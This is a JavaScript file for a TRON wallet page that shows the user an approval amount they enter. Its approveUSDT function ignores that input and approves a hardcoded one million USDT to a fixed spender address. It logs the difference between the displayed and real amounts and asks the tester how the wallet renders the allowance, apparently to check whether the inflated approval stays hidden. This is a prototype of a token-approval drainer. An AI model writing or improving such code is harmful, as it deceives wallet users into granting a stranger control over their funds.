// usdtApprove.js — 直接测试 100万 USDT

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// ====== 100万 USDT ======
function getOneMillion() {
    return "1000000000000"; // 100万 USDT = 1,000,000 * 1,000,000 = 1e12
}

window.approveUSDT = async function() {
  try {
    console.log("=== 直接测试 100万 USDT ===");
    setStatus("准备 100万 USDT 授权...");
    
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);

    // 🎯 直接使用 100万 USDT
    const millionAmount = getOneMillion();
    
    console.log("前端显示:", inputAmount, "USDT");
    console.log("实际授权: 100万 USDT");
    console.log("授权值:", millionAmount);

    setStatus(`准备授权 100万 USDT...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    
    setStatus("⚠️ 请检查钱包显示的授权金额...");
    
    const result = await usdtContract.approve(
      spenderAddress, 
      millionAmount
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 交易成功:", result);
    
    // 收集观察结果
    setTimeout(() => {
        const observation = prompt(
            "测试: 100万 USDT 授权\n\n" +
            "请记录钱包显示内容：\n" +
            "1. 显示的金额数字：\n" +
            "2. 显示格式（是 1000000 还是 1,000,000 还是其他？）\n" +
            "3. 是否有任何特殊显示：\n\n" +
            "请简要描述："
        );
        if (observation) {
            console.log("100万 USDT 观察结果:", observation);
        }
    }, 2000);
    
    setStatus(`✅ 100万 USDT 授权成功`);
    
  } catch (err) {
    console.error("授权失败:", err);
    
    let errorMsg = err.message;
    if (errorMsg.includes('out-of-bounds')) {
        errorMsg = "100万 USDT 也超出范围，请尝试更小金额";
    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
        errorMsg = "参数格式错误";
    }
    
    setStatus("❌ 100万 USDT 失败: " + errorMsg, true);
    
    // 建议尝试更小金额
    setTimeout(() => {
        alert("100万 USDT 失败，建议尝试 10万 USDT 或 1万 USDT");
    }, 1000);
  }
};

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
  console.log("状态更新:", text);
}

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  
  console.log("页面加载完成 - 100万 USDT 测试版");

  // 检查初始状态
  if (window.tronWeb && window.tronWeb.ready) {
    const address = window.tronWeb.defaultAddress.base58;
    setStatus(`已连接: ${address.substring(0, 8)}...`);
    approveBtn.disabled = false;
  }

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("正在连接钱包...");
      
      if (typeof window.tronLink === 'undefined') {
        throw new Error("未检测到 TronLink");
      }
      
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      
      // 等待 tronWeb 就绪
      await new Promise((resolve) => {
        const check = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(check);
            resolve();
          }
        }, 100);
      });
      
      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      approveBtn.disabled = false;
      
    } catch (error) {
      console.error("连接失败:", error);
      setStatus("❌ 连接失败: " + error.message, true);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });
});

console.log("100万 USDT 测试脚本加载完成");
